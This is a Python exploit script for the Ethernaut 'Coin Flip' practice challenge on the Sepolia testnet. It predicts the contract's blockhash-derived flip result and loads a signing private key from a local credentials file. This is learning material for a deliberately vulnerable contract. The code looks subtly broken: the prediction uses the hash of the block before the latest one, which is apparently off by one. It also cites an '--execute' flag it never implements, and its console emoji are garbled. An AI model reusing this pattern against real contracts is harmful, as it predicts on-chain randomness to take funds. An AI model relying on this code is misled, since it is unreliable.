#!/usr/bin/env python3
"""
Ethernaut Level 3: Coin Flip Exploit
Predict "random" outcomes using blockhash
"""

from web3 import Web3
import os
import json

# CoinFlip contract ABI (minimal)
COINFLIP_ABI = [
    {"inputs": [{"internalType": "bool", "name": "_guess", "type": "bool"}], "name": "flip", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "consecutiveWins", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

RPC_URL = "https://rpc.sepolia.org"
FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968

def load_credentials():
    creds_path = "/home/node/.openclaw/workspace/.secure/eth_credentials.json"
    if os.path.exists(creds_path):
        with open(creds_path) as f:
            return json.load(f)
    return None

def predict_coin_flip(w3):
    """Predict coin flip outcome using same logic as contract"""
    block_number = w3.eth.block_number
    block_hash = w3.eth.get_block(block_number - 1)['hash']
    block_value = int(block_hash.hex(), 16)
    coin_flip = block_value // FACTOR
    return coin_flip == 1

def main():
    print("=" * 60)
    print("Ethernaut Level 3: Coin Flip Exploit")
    print("=" * 60)
    
    creds = load_credentials()
    if not creds:
        print("âŒ No credentials found")
        return
    
    contract_address = input("\nEnter CoinFlip contract address: ").strip()
    if not contract_address:
        print("âŒ Contract address required")
        return
    
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("âŒ Failed to connect to Sepolia")
        return
    
    account = w3.eth.account.from_key(creds['private_key'])
    contract = w3.eth.contract(address=contract_address, abi=COINFLIP_ABI)
    
    print(f"\nğŸ”— Connected to Sepolia")
    print(f"ğŸ‘¤ Attacker: {account.address}")
    
    # Check current streak
    wins = contract.functions.consecutiveWins().call()
    print(f"\nğŸ¯ Current consecutive wins: {wins}/10")
    
    if wins >= 10:
        print("\nâœ… Level complete! Submit instance to Ethernaut.")
        return
    
    # Predict next flip
    prediction = predict_coin_flip(w3)
    print(f"\nğŸ”® Prediction for next block: {'HEADS' if prediction else 'TAILS'}")
    
    print("\nğŸ“ Exploit Plan:")
    print(f"   1. Predict outcome using blockhash(block.number - 1)")
    print(f"   2. Call flip({'true' if prediction else 'false'})")
    print(f"   3. Must be done quickly - next block changes hash!")
    print(f"   4. Repeat until 10 consecutive wins")
    
    print("\nâš ï¸  Must execute within same block window")
    print("   Use --execute flag when ready")

if __name__ == "__main__":
    main()
